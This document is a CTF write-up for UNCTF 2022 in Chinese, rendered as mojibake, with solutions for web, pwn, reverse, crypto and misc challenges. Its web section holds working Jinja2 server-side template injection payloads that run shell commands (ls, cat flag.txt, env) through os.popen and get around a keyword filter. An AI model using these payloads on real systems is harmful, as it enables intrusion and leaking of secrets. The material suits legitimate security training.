å‘ç°æœåŠ¡ç«¯å¯èƒ½ç¦æ­¢æˆ‘ä»¬ä½¿ç”¨ `__class__` åé¢æˆ‘å°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°å¥½åƒåªè¦å­˜åœ¨ `class` è¿™ä¸ªå­—æ ·å°±ä¼šç»™æˆ‘ä»¬è¿™ä¸ªå¼¹çª—ã€‚

>  ä¸€å¼€å§‹æˆ‘æƒ³çš„æ˜¯ä¼šä¸ä¼šæ˜¯æœ¬åœ° `js` åˆ¤æ–­è¿™ä¸ªè¾“å…¥æ¡†çš„å†…å®¹ï¼Œåªè¦å«æœ‰ `class` å°±ç»™æˆ‘ä»¬å¼¹çª—ã€‚ç„¶åæˆ‘å°±å°† js ç¦ç”¨äº†ï¼Œå‘ç°å½“æˆ‘ä»¬è¾“å…¥æ¡†å†…å«æœ‰ `class` æ—¶è¿˜æ˜¯ä¼šå¼¹çª—ã€‚

è¿™å°±è¯´æ˜è¿™ä¸ªéªŒè¯ï¼Œåˆ¤æ–­æ˜¯åœ¨æœåŠ¡ç«¯å†…è¿›è¡Œçš„ï¼Œæˆ‘ä»¬è¿˜çŸ¥é“æˆ‘ä»¬ä¸ä¸€å®šè¦ä½¿ç”¨ `__class__` æ‰èƒ½æ„é€ pocï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡å¾ˆå¤šæ–¹å¼æ„é€  RCE ï¼Œ<font color=red>åœ¨` hackbar` å†…å­˜åœ¨ä¸€äº›ä¸åŒæ–¹å¼æ„é€  `ssti` çš„ `RCE`</font>

å¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ `self` æ¥æ„å»ºæˆ‘ä»¬çš„ RCE

![](/home/zh/GitHub/blog-article/CTF/writeup/unctf2022.assets/2022-11-21_17-09.png)

è¿™æ—¶å€™æˆ‘ä»¬çš„ post è¯·æ±‚å°±å˜æˆä¸‹é¢è¿™ä¸€æ®µ payload äº†ã€‚

```python
pwd=1&user={{self.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}
```

è¿è¡Œå®Œä¹‹åï¼Œå‘ç°æˆåŠŸç»™æˆ‘ä»¬è¿”å› `ls` å‘½ä»¤çš„ç»“æœï¼Œè¯´æ˜è¿™ä¸ª RCE æˆ‘ä»¬åˆ©ç”¨æˆåŠŸäº†ã€‚

![](/home/zh/GitHub/blog-article/CTF/writeup/unctf2022.assets/2022-11-21_17-10.png)



å‘ç°é‡Œé¢æœ‰ä¸ª `flag.txt` ä½¿ç”¨ä¸‹é¢è¿™ä¸ª payload å‘ç°æ˜¯ä¸ªå‡çš„ `flag`

```python
pwd=1&user={{self.__init__.__globals__.__builtins__['__import__']('os').popen('cat ./flag.txt').read()}}
```

æ‰¾äº†å¥½ä¹…ï¼Œæœ€ååœ¨ç¯å¢ƒå˜é‡é‡Œé¢æˆåŠŸæ‰¾åˆ° `flag` å¯¹åº”çš„ payload å¦‚ä¸‹ï¼Œå…¶å®æˆ‘ä»¬åªéœ€è¦å°† `popen('command')`  é‡Œçš„ `command` æ”¹æˆæˆ‘ä»¬æƒ³è®©æœåŠ¡å™¨æ‰§è¡Œçš„ `shell` å‘½ä»¤å³å¯ã€‚

```python
pwd=1&user={{self.__init__.__globals__.__builtins__['__import__']('os').popen('env').read()}}
```

è¿è¡Œå®Œè¿™ä¸ª payload ä¹‹åæˆ‘ä»¬æˆåŠŸè·å¾— flag

![](./unctf_web.assets/2022-11-18_10-27.png)

### å¬è¯´phpæœ‰ä¸ªxxe

æˆ‘ä»¬æ‰“å¼€é“¾æ¥ï¼Œå‘ç°åªæœ‰ä¸€æ®µè¯ï¼Œå¦‚ä¸‹ï¼š

![](/home/zh/GitHub/blog-article/CTF/writeup/unctf2022.assets/2022-11-21_18-36.png)

çœ‹åˆ°è¿™é‡Œçš„æ—¶å€™ï¼Œæˆ‘å°±åœ¨æƒ³ä¼šä¸ä¼šè¦æˆ‘ä»¬ä¼ ä¸€ä¸ª `GET/POST` è¯·æ±‚å‚æ•°å« `hint `?

å°è¯•ä¸€ä¸‹ä¹‹åå‘ç°ä¸è¡Œã€‚

<font color=red>ç„¶åæˆ‘ä»¬å°±å¯¹è¿™ä¸ªé“¾æ¥è¿›è¡Œäº†ç›®å½•æ‰«æå’Œå‘ç°ï¼Œå‘ç°æˆ‘ä»¬è¿˜èƒ½è®¿é—®Â `dom.php`</font>

![](/home/zh/GitHub/blog-article/CTF/writeup/unctf2022.assets/2022-11-21_18-35.png)



![](./unctf_web.assets/2022-11-18_11-03.png)

## Pwn

### welcomeUNCTF

ä½¿ç”¨ ida é€†å‘åˆ†æï¼Œå‘ç°æˆ‘ä»¬åªéœ€è¦è¾“å…¥ `UNCTF&2022` å³å¯è·å¾—flag

![](./unctf_pwn.assets/Snipaste_2022-11-20_21-53-18.png)

æˆ‘ä»¬ä½¿ç”¨ nc é“¾æ¥å…¶æœåŠ¡å™¨ï¼Œç„¶åè¾“å…¥ `UNCTF&2022` å³å¯

![](./unctf_pwn.assets/2022-11-20_22-33.png)

### çŸ³å¤´å‰ªåˆ€å¸ƒ

![](./unctf_pwn.assets/Snipaste_2022-11-20_22-16-55.png)

![](./unctf_pwn.assets/Snipaste_2022-11-20_22-17-28.png)


ç¼–å†™ exp 

```python
from pwn import *
import random

proc = process("./pwn")

proc.recvuntil(b'later?(y/n)')
proc.sendline(b'y')

content = [0, 1, 2]

know_list = [
    0, 0, 1, 1, 2, 1, 1, 0, 1, 1, 1, 1, 2, 2, 1, 0, 2, 0, 1, 2, 2, 0, 0, 0, 0,
    1, 0, 0, 0, 2, 2, 1, 2, 0, 1, 2, 2, 0, 2, 1, 0, 1, 0, 1, 2, 0, 0, 0, 2, 2,
    1, 2, 1, 0, 1, 0, 2, 2, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 2, 1, 2, 1, 2, 2,
    0, 1, 1, 1, 2, 2, 0, 2, 0, 2, 2, 1, 2, 0, 2, 2, 1, 0, 0, 0, 0, 2, 0, 0, 1
]

know_length = len(know_list)

for i in range(len(know_list)):
    proc.sendline(bytes(str(know_list[i]), encoding='utf-8'))
proc.interactive()
```
![](./unctf_pwn.assets/2022-11-20_18-17.png)

## Reverse

![](/home/zh/GitHub/blog-article/CTF/writeup/unctf2022.assets/Snipaste_2022-11-20_22-04-44.png)

![](/home/zh/GitHub/blog-article/CTF/writeup/unctf2022.assets/Snipaste_2022-11-20_22-03-50.png)


![](./unctf_re.assets/2022-11-20_22-05.png)



![](./unctf_re.assets/Snipaste_2022-11-20_21-56-24.png)

![](./unctf_re.assets/Snipaste_2022-11-20_22-00-10.png)
![](./unctf_re.assets/Snipaste_2022-11-20_22-01-52.png)
![](./unctf_re.assets/Snipaste_2022-11-20_22-02-19.png)



### whereisyourkey

```python
compare = [118, 103, 112, 107, 99, 109, 104, 110, 99, 105]
flag = []


def foo(chr_i):
    if ord(chr_i) == ord('m'):
        return chr_i
    if ord(chr_i) <= 111:
        if ord(chr_i) <= 110:
            return chr(ord(chr_i) - 2)
    else:
        return chr(ord(chr_i) + 3)


print("-------------")
for i in compare:
    print(chr(i), end='')

print()
for i in compare:
    res = foo(chr(i))
    print(res, end='')
print()

```

### ezzzzre


```python

```



### ezast



```js
function ezdecode(flag, key) {
	var arr_data = flag.split("");
	return arr_data.map((i) => String.fromCharCode(i.charCodeAt ^ (key + 1)).join(""));
}
var $_a = test();

$_a -= 1145 * 100;

$_a += 0xb;

console.log(ezdecode("OTYN\\a[inE+iEl.hcEo)ivo+g", $_a));

function test() {
	return 114514;
}
```

ç¼–å†™ exp 

```python
key = 26 # 114514 - (1145 * 100) + 0xb

flag = "OTYN\\a[inE+iEl.hcEo)ivo+g"

for i in flag:
    print(chr(ord(i) ^ key), end='')
```


## Crypto


### md5-1

```python
from string import printable
import hashlib

if __name__ == '__main__':
    with open("./out.txt", 'r') as reader:
        hash_content = [i.strip() for i in reader.readlines()]
    for hash_str in hash_content:
        for i in printable:
            hashobj = hashlib.md5()
            hashobj.update(i.encode("utf-8"))
            res = hashobj.hexdigest()
            if res == hash_str:
                print(i, end='')
            else:
                pass
```
![](./unctf_crypto.assets/2022-11-19_17-03.png)

### dddd


![](./unctf_crypto.assets/2022-11-19_17-05.png)
![](./unctf_crypto.assets/2022-11-19_17-14.png)
![](./unctf_crypto.assets/2022-11-19_17-20.png)



### caesar

```python
table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

flag = "B6vAy{dhd_AOiZ_KiMyLYLUa_JlL/HY_}"
for i in range(len(flag)):
    res = table.find(flag[i])
    if res == -1:
        print(flag[i], end='')
    else:
        print(table[(res + 19) % len(table)], end='')
```

### md5-2

```python
from hashlib import md5
import hashlib

from string import printable


def str2hash(charset: str):
    hashobj = hashlib.md5()
    hashobj.update(charset.encode("utf-8"))
    chr_hash = hashobj.hexdigest()
    return chr_hash


def crack_hash(reshash):
    # because the str2hash will return 32 bits result like: str2hash('C') will return '0d61f8370cad1d412f80b84d143e1257'
	# but the hex(int(hex,16)) will strip the zero in the prefix
	# for example hex(int('0dff',16)) will return '0xdff' the prefix zero info will be lost
    assert (len(reshash) <= 32) 
    if (len(reshash) != 32):
        offset_zero = 32 - len(reshash)
        reshash = '0' * offset_zero + reshash
    assert (len(reshash) == 32)
    for chri in printable:
        hashi = str2hash(chri)
        if hashi == reshash:
            return chri
    return '.'


with open("./out.txt", 'r') as reader:
    lines = [line.strip() for line in reader.readlines()]

flag = ""
for index, value in enumerate(lines):
    if index == 0:
        flag += crack_hash(value)
    else:
        temp_hex = hex(int(str2hash(flag[-1]), 16) ^ int(value, 16))[2:]
        flag += crack_hash(temp_hex)
print(flag)
```

```
UNCTF{a197271943ceb3c3fe98bcadf10c29d4}
```


### ezRSA

```python
import libnum
import binascii

p = 89065756791595323358603857939783936930073695697065732353414009005162022399741
n = 62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561

e = 65537
c = 56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504

phi_n = p ** 4 - p ** 3

d = libnum.invmod(e, phi_n)
res = pow(c, d, n)

flag = hex(res)[2:]

print(binascii.unhexlify(flag))

```

### Single table

æ‰“å¼€æ–‡ä»¶ï¼Œä¸€çœ‹å°±çŸ¥é“æ˜¯å˜å¼‚çš„ playfair å¯†ç ,åªæ˜¯ playfair æ˜¯å°†å­—ç¬¦åŠ åœ¨å‰é¢ï¼Œè¿™ä¸ªæ˜¯å¼„åœ¨åé¢

> è¿™é“é¢˜åœ¨æ¯”èµ›æ—¶æˆ‘æ˜¯æ‰‹æ’•çš„,è™½ç„¶å½“æ—¶æˆ‘å·²ç»å†™å¥½äº†æ­£å¸¸ playfair åŠ è§£å¯†è„šæœ¬

å”¯ä¸€éœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯å› ä¸ºå•æ•°ï¼Œæœ€åè§£å‡ºæ¥ä¼šå¤šä¸€ä¸ªxæˆ‘ä»¬éœ€è¦å°†è¿™ä¸ªX ç»™åˆ æ‰å³å¯

`UNCTF{GOD_YOU_KNOW_PLAYFAIRX}`

```python
#! /usr/bin/env python3
# @author zhouhao 2022-11-16 08:23
from string import ascii_lowercase

class Eplayfair:

    def __init__(self, plaintext: str, key: str):
        assert (isinstance(plaintext, str))
        assert (isinstance(key, str))
        self.__plaintext = plaintext
        self.__key = key
        self.__table = []

    @property
    def plaintext(self):
        return self.__plaintext.lower()

    @property
    def key(self):
        return self.__key.lower()

    @property
    def table(self):
        # gen table and return table
        if len(self.__table) == 0:
            return self.__table
        else:
            self.preprocess()
            return self.__table

    def ptable(self):
        # print the playfair two dimension table
        assert (len(self.table) > 0) # it will call the table() function
        for i in range(len(self.__table)):
            print(self.table[i])

    def preprocess(self):
        plaintext = self.plaintext
        key = self.key
        template_list = list(ascii_lowercase)
        contrast_table = []
        preprocessed_ptext = []

        # +---------------------------------------------+
        # |  if q in keys or plaintext: (i replace j)   |
        # |  else do not use q                          |
        # +---------------------------------------------+

        # preprocess the plaintext (strip the special char like ({}(*=).,) ...)
        for i in plaintext:
            if i not in ascii_lowercase:
                plaintext = plaintext.replace(i, '')
            else:
                ...

        if (len(plaintext) % 2 != 0):
            plaintext += 'x'

        assert (len(plaintext) % 2 == 0)

        # eg: flag{aabbc} -> ["fl","ag","ax",'bx','cx'] contain in preprocessed_ptext
        for i in range(0, len(plaintext), 2):
            temp = plaintext[i:i + 2] # represent a group
            # if len(flag) is even number
            if temp[0] == temp[1]:
                res = temp[0] + 'x'
                preprocessed_ptext.append(res)
            else:
                pass

        # if q in key or plaintext then merge the j and i
        plaintext = plaintext.replace('j', 'i')
        key = key.replace('j', 'i')
        template_list.remove('j')

        for i in key:
            if i in set(template_list):
                template_list.remove(i)
            else:
                print("error!!")
                exit(-1)

        template_list.extend(key)
        contrast_table = template_list

        # double check the generated table's length must be 25
        assert (len(contrast_table) == 25)
        """ 
        ---------------------------------------------------------------------------------
          [follow line function] split the list five by five.
          List comprehension,if you want to know more about this,you can follow blow link.
          https://en.wikipedia.org/wiki/List_comprehension
          eg: [1,2,3,4,5,6,7,8,9,10] -> [[1,2,3,4,5],[6,7,8,9,10]].
        ---------------------------------------------------------------------------------
        """
        self.__table = [contrast_table[i:i + 5] for i in range(0, 25, 5)]
        return plaintext, self.__table

    def process(self):
        """
        this function will generate the plaintext
        """
        # generator https://realpython.com/introduction-to-python-generators/
        plaintext, table = self.preprocess()
        for i in range(len(plaintext)):
            for row in range(len(table)):
                for col in range(len(table[row])):
                    if plaintext[i] == table[row][col]:
                        yield (row, col)
                    else:
                        pass

    def decode(self):
        gen_mechine = self.process()
        processed_data = []
        # gain all data
        while True:
            try:
                processed_data.append(next(gen_mechine))
            except StopIteration:
                temp = [
                    processed_data[i:i + 2]
                    for i in range(0, len(processed_data), 2)
                ]
                # temp format : [[(1,2),(3,4)],[(3,2),(2,4)],...]
                # [
                #  [(1,2),(3,4)],
                #  [(3,2),(2,4)],
                #   ...
                # ]

                decrypted_data = ""
                # This Code Segment Can Be Optimized! (below)
                # All in all this code is contrast the table and return the result
                for i in range(len(temp)):
                    lhs_xcoord_i = temp[i][0][1]
                    lhs_ycoord_i = temp[i][0][0]
                    rhs_xcoord_i = temp[i][1][1]
                    rhs_ycoord_i = temp[i][1][0]
                    if lhs_xcoord_i == rhs_xcoord_i: # the same colums
                        decrypted_data += self.table[(lhs_ycoord_i - 1) %
                                                     5][lhs_xcoord_i]
                        decrypted_data += self.table[(rhs_ycoord_i - 1) %
                                                     5][rhs_xcoord_i]
                    elif lhs_ycoord_i == rhs_ycoord_i: # the same rows
                        decrypted_data += self.table[lhs_ycoord_i][
                            (lhs_xcoord_i - 1) % 5]
                        decrypted_data += self.table[rhs_ycoord_i][
                            (rhs_xcoord_i - 1) % 5]
                    else:
                        decrypted_data += self.table[rhs_ycoord_i][
                            lhs_xcoord_i]
                        decrypted_data += self.table[lhs_ycoord_i][
                            rhs_xcoord_i]
                self.encdata = decrypted_data
                print(decrypted_data)
                exit(0)


if __name__ == '__main__':
    eins = Eplayfair("OTUBM{BCQS_PHW_OQAU_AYFMKLWS}", "PLAY")
    eins.preprocess()
    eins.ptable()
    print("flag is :")
    eins.decode()
```



### Multi table

```python
from string import ascii_uppercase

flag = "SDCGW{MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD}"
base_table = [
    'J', 'X', 'I', 'S', 'E', 'C', 'R', 'Z', 'L', 'U', 'K', 'Q', 'Y', 'F', 'N',
    'V', 'T', 'P', 'O', 'G', 'A', 'H', 'D', 'W', 'M', 'B'
]
key = [9, 15, 23, 16]

# VigenÃ¨re Cipher Table
# abcdefghijklmnopqrstuvwxyz
# bcdefghijklmnopqrstuvwxyza
# cdefghijklmnopqrstuvwxyzab
# defghijklmnopqrstuvwxyzabc
# efghijklmnopqrstuvwxyzabcd
# fghijklmnopqrstuvwxyzabcde
# ghijklmnopqrstuvwxyzabcdef
# hijklmnopqrstuvwxyzabcdefg
# ijklmnopqrstuvwxyzabcdefgh
# jklmnopqrstuvwxyzabcdefghi
# klmnopqrstuvwxyzabcdefghij

table = {}
for i in range(26):
    table[i] = ascii_uppercase[i:] + ascii_uppercase[:i]

c = ''
x = 0
result = ''
for i in range(len(flag)):
    if flag[i] in ascii_uppercase:
        offset = table[key[x % 4]].find(flag[i])
        temp = base_table[offset]
        result += temp
        x += 1
    else:
        result += flag[i]
print(result)

```
### ä»Šæ™šåƒä»€ä¹ˆ

ä¸€çœ‹é¢˜ç›®å°±æƒ³åˆ°äº†åŸ¹æ ¹å¯†ç 

![](./unctf_crypto.assets/2022-11-19_17-37.png)

è§£æˆ `RRRA...` ä¹‹åå‘ç°è¿™ä¸ªè¿˜èƒ½è¿›è¡ŒåŸ¹æ ¹è§£ç 

`RRRARARRRRARAARRAAARARRRRRAARARARRRARRRARRARAARRAARAARR`

> å½“æ—¶æäº¤è¿™ä¸ªé¢˜ç›®çš„æ—¶å€™ï¼Œæ˜¾ç¤ºé”™è¯¯ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯æˆ‘çš„æ€è·¯æœ‰é—®é¢˜ï¼Œä½†æ˜¯çœ‹è§£ç å‡ºæ¥çš„ä¸œè¥¿åˆä¸åƒé”™è¯¯çš„,åŸæ¥æ˜¯ä¸»åŠæ–¹è®¾ç½®é”™äº†ã€‚

![](./unctf_crypto.assets/2022-11-19_17-43.png)



### Today_is_Thursday_V_me_50

```python
import random
import itertools
from Crypto.Util.number import *
from Crypto.Util.strxor import strxor

name = "unctf"
key1 = "Today_is_Thursday_V_me_50" # 25
key1_num = bytes_to_long(key1.encode('utf-8'))


def crack_2(message, key):
    random.seed(key)
    res = b""
    for i in message:
        temp_num = random.randint(1, 128)
        res += long_to_bytes(temp_num ^ i)
    return res


def crack_1(message, key):
    name = "unctf"
    guess = [i for i in itertools.permutations(name, 5)]
    res = bytes()
    for i in range(4):
        what = guess.pop(50) # random poor
        name = ''.join(j for j in what)
        mask = strxor(bytes(name * 5, encoding='utf-8'),
                      bytes(key, encoding='utf-8'))

        res = strxor(mask, message)
    return res


if __name__ == '__main__':
    crypto_data = b'Q\x19)T\x18\x1b(\x03\t^c\x08QiF>Py\x124DNg3P'
    res = crack_2(crypto_data, key1_num)
    print(res)
    myflag = crack_1(res, key1)
    print(myflag)
```

### Alien's_secret


æˆ‘ä»¬å°†è¿™ä¸ªå›¾ç‰‡æ”¾å…¥ google æœå›¾ï¼ŒæˆåŠŸæ‰¾åˆ°å…¶åŠ å¯†æ–¹å¼çš„ç½‘ç«™


[Alian font used in the background](http://uazu.net/notes/alien.html)

å°±æ˜¯å•è¡¨æ›¿æ¢ï¼Œæˆ‘ä»¬å¯¹ç…§ä¸Šé¢è¿™å¼ è¡¨ï¼Œå°±èƒ½è·å¾— flag
## Misc

### magic_word

ä¸‹è½½é™„ä»¶ä¹‹åï¼Œå‘ç°é‡Œé¢æœ‰ä¸€ä¸ª `doc` æ–‡æ¡£ï¼Œè¿™è¾¹ä½¿ç”¨ linux çš„ `libreoffice` åŠå…¬è½¯ä»¶æ‰“å¼€ä¹‹åå‘ç°äº†ä¸€å¤§å †ä¹±ç 

![](./unctf_misc.assets/2022-11-18_13-41.png)

æˆ‘ä»¬å…ˆå°†æ–‡æ¡£å…¨é€‰å¤åˆ¶ä¸€ä¸‹,ä¿å­˜åˆ° vim é‡Œ, <font color="red"> å‘ç°æ˜¯é›¶å®½éšå†™ </font>

![](./unctf_misc.assets/2022-11-18_13-38.png)

è¿™è¾¹æˆ‘ä½¿ç”¨ä¸€ä¸ª[åœ¨çº¿ç½‘ç«™](http://330k.github.io/misc_tools/unicode_steganography.html) æ¥è¿›è¡Œé›¶å®½éšå†™è§£ç  

![](./unctf_misc.assets/2022-11-17_18-48.png)

è§£ç ä¹‹åæˆåŠŸè·å¾— flag 
```
UNCTF{We1come_new_ctfer}
```

### æ‰¾å¾—åˆ°æˆ‘å—

ä¸‹è½½é™„ä»¶è§£å‹ä¹‹åï¼Œæ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ª word æ–‡æ¡£

æˆ‘ä»¬æ‰“å¼€ä¹‹åå¹¶æ²¡æœ‰å‘ç°ä»»ä½•ä¸œè¥¿ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬èƒ½å°†å­—ä½“å˜æˆç™½è‰²ï¼Œè¾¾åˆ°éšå†™å†…å®¹çš„ç›®çš„ã€‚

![](./unctf_misc.assets/2022-11-18_14-28.png)

æˆ‘ä»¬å…¨é€‰wordæ–‡æ¡£å†…çš„ä¸œè¥¿ï¼Œå‘ç°çœŸçš„èƒ½å¤Ÿè¢«å…¨é€‰ï¼Œç„¶åæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹å­—ä½“é¢œè‰²ã€‚

å‘ç°é‡Œé¢æ˜¾ç¤ºäº†ä¸€æ®µæ–‡å­—,ä½†å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯,åœ¨é‡Œé¢å‘ç°äº†ä¸€ä¸ªå…³é”®å­— `font`ã€‚

![](./unctf_misc.assets/2022-11-18_14-29.png)

è€Œ word æ–‡æ¡£å…¶å®æ˜¯ä¸€ä¸ªå‹ç¼©å½¢å¼çš„æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨binwalkï¼Œæˆ–è€…å°†å…¶åç¼€æ”¹ä¸º zip ç„¶åè§£å‹è·å¾—é‡Œé¢çš„ä¸œè¥¿ã€‚

![](./unctf_misc.assets/2022-11-18_14-31.png)

è§£å‹ä¹‹åï¼Œè·å¾—äº†å‡ ä¸ªç›®å½•,æˆ‘ä»¬å¯ä»¥çœ‹è§ä¸€ä¸ª `fontTable.xml`,è¿™ä¸ªå’Œæˆ‘ä»¬åˆšåˆšçœ‹è§çš„å…³é”®å­—å¾ˆåƒï¼Œå¾ˆæœ‰å¯èƒ½flagå°±è—åœ¨é‡Œé¢

![](./unctf_misc.assets/2022-11-18_14-32.png)

æ‰“å¼€ä¹‹åï¼Œæœç´¢ `flag` æˆåŠŸè·å¾— `flag`


![](./unctf_misc.assets/2022-11-18_14-33.png)

æˆ–è€…ç›´æ¥ä½¿ç”¨ä»¥ä¸‹shellå‘½ä»¤æ¥è¿›è¡ŒæŸ¥æ‰¾flagï¼Œä¹Ÿæ˜¯å¯ä»¥è·å¾—flag

```bash
find . | xargs cat | grep -nse flag
```

### syslog

ä¸‹è½½é™„ä»¶ä¹‹åï¼Œå‘ç°é‡Œé¢æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä½†æ˜¯è§£å‹éœ€è¦å¯†ç 

æˆ‘ä»¬å…ˆä½¿ç”¨ `binwalk` çœ‹çœ‹è¿™ä¸ªæ–‡ä»¶é‡Œä¼šä¸ä¼šè—äº†åˆ«çš„ä¸œè¥¿

![](./unctf_misc.assets/2022-11-18_14-34.png)

æœä¸å…¶ç„¶ï¼Œé‡Œé¢è—äº†ä¸€ä¸ª `syslog` æ–‡ä»¶ï¼Œåˆ†ç¦»å‡ºæ¥ä¹‹åæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°æ˜¯å­—ç¬¦æ–‡ä»¶ã€‚

![](./unctf_misc.assets/2022-11-18_14-35.png)

æˆ‘ä»¬ä½¿ç”¨ vim æ‰“å¼€ä¹‹åå‘ç°è¿™ä¸ªæ–‡ä»¶æ˜¯ ubuntu çš„æ—¥å¿—æ–‡ä»¶

![](./unctf_misc.assets/2022-11-18_14-36.png)

æˆ‘ä»¬å…ˆæŸ¥æ‰¾ä¸€ä¸‹ flag çœ‹è¿™ä¸ªæ–‡ä»¶é‡Œæ˜¯å¦å­˜åœ¨ flag

å‘ç°äº† `flag is not here` ä½†å¹¶æ²¡æœ‰è·å¾—æˆ‘ä»¬æƒ³è¦çš„ flag

![](./unctf_misc.assets/2022-11-18_14-36_1.png)

<div style="border-radius:15px;display:block;background-color:#a8dadc;border:2px solid #aaa;margin:15px;padding:10px;">
æˆ‘åœ¨è¿™é‡Œå¡äº†ä¸€æ®µæ—¶é—´ï¼Œç›´åˆ°æˆ‘å†ä¸€æ¬¡æŸ¥çœ‹å½“å‰ç›®å½•ï¼Œå‘ç°å­˜åœ¨ <code>flag.zip</code> å¹¶ä¸”è¿™ä¸ªå‹ç¼©åŒ…è¿˜è¢«åŠ å¯†äº†,é‚£è‚¯å®š flag åœ¨è¿™ä¸ªå‹ç¼©åŒ…å†…ï¼Œé‚£ <code>syslog</code> è‚¯å®šå°±æ˜¯ä¸€äº›æç¤ºä¿¡æ¯ï¼Œæˆ–è€…å‹ç¼©åŒ…å¯†ç .
</div>

![](./unctf_misc.assets/2022-11-18_14-37.png)

æˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å»æŸ¥æ‰¾å¯†ç ,å‘ç°æˆåŠŸè·å¾—ä¸€æ®µ base64

```bash
cat ./syslog | grep -inse 'pass'
```

![](./unctf_misc.assets/2022-11-18_14-40.png)

æˆ‘ä»¬ä½¿ç”¨ `cyber chief` å¯¹è¿™ä¸€æ®µ base64 è¿›è¡Œè§£ç 

æˆåŠŸè·å¾—å¯†ç  `U6nu2_i3_b3St`

![](./unctf_misc.assets/2022-11-18_14-41.png)

æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªå¯†ç å¯¹å‹ç¼©åŒ…è¿›è¡Œè§£å‹ç¼©æˆ–è·å¾— flag.txt

æˆåŠŸè·å¾— flag
![](./unctf_misc.assets/2022-11-18_14-42.png)

```
UNCTF{N1_sH3_D0n9_L0g_dE!}
```

### ç¤¾ä»€ä¹ˆç¤¾

æˆ‘ä»¬ä¸‹è½½è¿™ä¸ªé™„ä»¶,è§£å‹ä¹‹åå¾—åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚

æˆ‘ä»¬æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°å…¨éƒ¨éƒ½æ˜¯ # å’Œä¸‹åˆ’çº¿ã€‚

![](./unctf_misc.assets/2022-11-18_14-53.png)

æˆ‘ä»¬çŸ¥é“è¿™ä¸ªé¢˜ç›®çš„æè¿°æ˜¯å«æˆ‘ä»¬æ‰¾æ™¯ç‚¹

![](./unctf_misc.assets/2022-11-18_14-57.png)

æˆ‘ä»¬å¯ä»¥å…ˆå°†è¿™ä¸ªæ–‡ä»¶ç¼©å°ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ç±»ä¼¼ä¸€å¼ å›¾ç‰‡ã€‚

<font color="red">è¿™å¼ å›¾ç‰‡ç€å®æŠŠæˆ‘çœ¼ç›ç»™çœ‹çäº†.</font>

<div align="center">
<img src="./unctf_misc.assets/2022-11-18_14-54.png" width="60%" styles="text-align:center;">
</div>

> æœ€åå‘ç°å¥½å¤šäººå†™å‡ºè¿™é“é¢˜ç›®ï¼Œæˆ‘å°±æƒ³è¿™ä¸ªåœ°ç‚¹ä¼šä¸ä¼šå’Œå‡ºé¢˜äººçš„åœ°æ–¹ä¸€æ ·

ç„¶åæˆ‘å°±å»ç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹,å‘ç°å¥½åƒåªæœ‰å‡¤å‡°å¤åŸæœ€åƒè¿™å¼ å›¾ç‰‡ã€‚

![](./unctf_misc.assets/2022-11-18_14-59.png)

ç„¶åæˆ‘ä»¬å¯¹å…¶è¿›è¡Œä¸€ä¸‹ md5 åŠ å¯†ï¼Œç„¶åè½¬æ¢æˆå¤§å†™

![](./unctf_misc.assets/2022-11-18_15-06.png)

### In_the_Morse_Garden


å‘ç°åªæœ‰ä¸€ä¸ª pdf æ–‡ä»¶ï¼Œæˆ‘ä»¬æ‰“å¼€è¿™ä¸ª pdf æ–‡ä»¶å‘ç°åªæœ‰ä¸€å¼ å›¾ç‰‡ï¼Œè€Œä¸”è¿™ä¸ªå›¾ç‰‡æ˜¯ä¸ªè¶…é“¾æ¥,é“¾æ¥åˆ°äº† `cyber chef`

![](./unctf_misc.assets/2022-11-18_15-07.png)

<div style="border-radius:15px;display:block;background-color:pink;border:2px solid #aaa;margin:15px;padding:10px;">
ç„¶åæˆ‘ä½¿ç”¨ foremost å¯¹å…¶è¿›è¡Œåˆ†ç¦»ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯ä¿¡æ¯éšè—åœ¨å›¾ç‰‡é‡Œé¢,åé¢å°±æ˜¯å›¾ç‰‡éšå†™çš„ä¸€ç³»åˆ—éªšæ“ä½œï¼Œå°è¯•å®Œæ‰€æœ‰å·²çŸ¥çš„æ–¹å¼åï¼Œä»ç„¶ä¸€æ— æ‰€è·.
</div>

+ åé¢æˆ‘å°±æƒ³ä¼šä¸ä¼š pdf é‡Œé¢éšå†™äº†æ–‡æœ¬ä¿¡æ¯
	+ æ‰€ä»¥æˆ‘å°±ä½¿ç”¨ Okular (linux) å°† pdf å¯¼å‡ºæˆ plaintext (æ–‡æœ¬å½¢å¼)
	+ å¦‚æœåœ¨windowsä¸‹å¯ä»¥ä½¿ç”¨officeï¼Œwpså¯¼å‡ºæˆwordæ–‡æ¡£åº”è¯¥ä¹Ÿè¡Œ (è¿™è¾¹æ²¡æœ‰è¿›è¡Œå°è¯•)

![](./unctf_misc.assets/2022-11-18_15-17.png)
```
